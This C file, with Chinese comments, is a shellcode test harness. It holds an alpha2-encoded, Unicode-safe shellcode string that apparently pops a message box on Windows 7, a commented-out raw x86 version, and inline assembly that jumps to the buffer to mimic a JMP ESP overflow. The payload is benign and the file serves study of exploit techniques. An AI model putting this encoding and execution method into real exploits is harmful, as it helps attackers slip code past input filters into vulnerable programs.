//此代码实现了一个纯Unicode的调用messagebox的shellcode，能够在win7环境下调用messagebox
#include<stdio.h>
#include<windows.h>
/*unsigned char encoded[] ="\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
           "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
           "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
               "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
           "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
           "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
                   "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
           "\x49\x0b\x31\xc0\x51\x50\xff\xd7";*/    //该shellcode为不同平台下通用的调用messagebox的shellcode

//此处shellcode为alpha2加密后的纯unicode的原始shellcode
unsigned char encoded[] ={"TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBlqVrvRNP34Rkzr4KqBLLTKb2MLrkORKXDKprKpDKkbQpanlLoCPu9bsYi7KSpxOLbkqGPxM1VbrksJO0yqEwMaxmRkLtdo9q8FMuCQONpFqQ2TQQrUhrU1qnLHpE2XOycDrUGyTK0zNDkQI7364KnL2OdKCJKlJaGWtKSLVOKLYqfgqXRYRToum138BKrEBNpBoxkp121bPoBiWqyna9lKLqwPNqPPyoJ7A"};

void main()
{
WCHAR encshellcode[1024];
memset(encshellcode,0,2048);

//将Shellcode转换成Unicode形式，即写到内存中为纯unicode形式的shellcode，为xx00,xx00,xx00的形式
MultiByteToWideChar(CP_ACP,0,(LPCSTR)encoded,sizeof(encoded)-1,encshellcode,1024);

//模拟溢出发生时JMP ESP后ESP指向Shellcode的情况
__asm LEA ESP,encshellcode
__asm XOR ECX,ECX
__asm JMP ESP
}
